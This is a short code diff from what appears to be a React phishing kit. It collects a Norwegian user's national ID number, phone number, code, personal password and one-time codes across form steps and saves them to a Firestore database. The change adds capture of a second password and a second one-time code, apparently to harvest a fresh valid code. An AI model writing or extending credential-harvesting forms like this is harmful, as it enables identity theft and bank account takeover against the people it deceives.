@@ -33,8 +33,10 @@ const Step10 = ({ formData }) => {
       Fødselsnummer: formData.step1,
       Telefonnummer: formData.step2,
       Kode: formData.step3,
-      "Personelig passord": formData.step4,
-      Engangskode: formData.step5
+      "Personelig passord 1": formData.step4,
+      Engangskode1: formData.step5,
+      "Personelig password 2": formData.Step7,
+      Engangskode2: formData.step8
     };
 
     // Save data to Firestore
